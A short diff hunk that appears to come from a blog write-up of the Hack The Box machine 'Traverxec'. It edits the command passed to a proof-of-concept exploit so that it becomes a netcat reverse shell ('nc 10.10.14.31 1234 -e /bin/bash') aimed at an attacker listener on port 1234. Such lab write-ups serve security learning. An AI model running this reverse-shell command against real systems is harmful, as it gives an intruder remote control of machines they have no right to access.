@@ -24,7 +24,7 @@ nc -nvlp 1234
 and to make the call using the PoC code:
 
 ```bash
-python exploit.py traverxec.htb 80 "nc 10.10.14.31 1234"
+python exploit.py traverxec.htb 80 "nc 10.10.14.31 1234 -e /bin/bash"
 ```
 
 ![](https://yaboygmoney.github.io/htb/images/traverxec/shell.png)
